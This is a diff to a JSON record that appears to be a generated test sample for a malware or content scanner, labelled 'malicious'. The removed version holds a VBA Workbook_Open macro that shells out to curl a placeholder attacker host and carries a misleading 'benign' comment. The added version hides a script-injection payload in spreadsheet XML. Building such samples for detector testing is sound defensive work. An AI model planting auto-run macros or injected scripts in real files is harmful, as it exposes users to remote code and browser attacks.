@@ -5,11 +5,11 @@
   "generator_id": "structural-variations",
   "generator_version": "1.0.0",
   "seed": -1795142585,
-  "content": "Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run <!-- benign --> \"curl http://evil.example.com/\"\nEnd Sub\n",
-  "content_hash": "edaa2c67fa11b9cdf6a2e4991516ce46631728d1206074990ce86f202c675e6b",
+  "content": "<section><si><t><!-- hidden content --><script>alert(1)</script></t></si>\n</section>",
+  "content_hash": "1ffabf694567059c35f78ae081b1cdd820bec480aa8a173f9a7063105ffd5225",
   "content_type": "text",
   "expected_verdict": "malicious",
   "expected_modules": [],
-  "variation_type": "structural:code-comments",
+  "variation_type": "structural:xml",
   "difficulty": "moderate"
 }
